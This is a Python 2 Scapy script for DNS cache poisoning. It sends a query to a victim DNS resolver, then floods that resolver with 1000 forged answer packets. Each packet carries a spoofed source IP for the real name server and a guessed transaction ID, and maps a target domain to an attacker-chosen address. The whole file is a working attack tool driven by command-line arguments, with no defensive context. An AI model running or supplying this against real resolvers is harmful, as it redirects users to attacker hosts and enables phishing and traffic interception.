from scapy.all import *
from scapy.layers.l2 import *
import time,sys

def usage():
    print "[*]Usage: python dns_cachepoisoning.py [SPOOF_ADDR] [VICTIM_DNS_SERVER] [FINAL_NAME_SERVER] [DOMAIN TO SPOOF]"

if len(sys.argv) < 5:
    usage()
    exit(0)

domainToSpoof = sys.argv[4]
SPOOF_ADDR = sys.argv[1]
FINAL_NAME_SERVER = sys.argv[3]
VICTIM_DNS_SERVER = sys.argv[2]
pkts = []

#flooding of the SPOOF IP to the victim DNS server
for x in range (10000,11000):		
	pkt = Ether()/IP(dst=VICTIM_DNS_SERVER,src=FINAL_NAME_SERVER)/UDP(dport=4250)/DNS(id=x,an=DNSRR(rrname=domainToSpoof, type='A', rclass='IN', ttl=350, rdata=SPOOF_ADDR))
	pkts.append(pkt)
    
#initial query to victim dns to search up domain to spoof    
dns = Ether()/IP(dst=VICTIM_DNS_SERVER,src=SPOOF_ADDR)/UDP()/DNS(qd=DNSQR(qname=domainToSpoof))
sendp(dns, verbose = 0)
print "Initial DNS query sent"
for pkt in pkts:
	sendp(pkt, verbose=0)
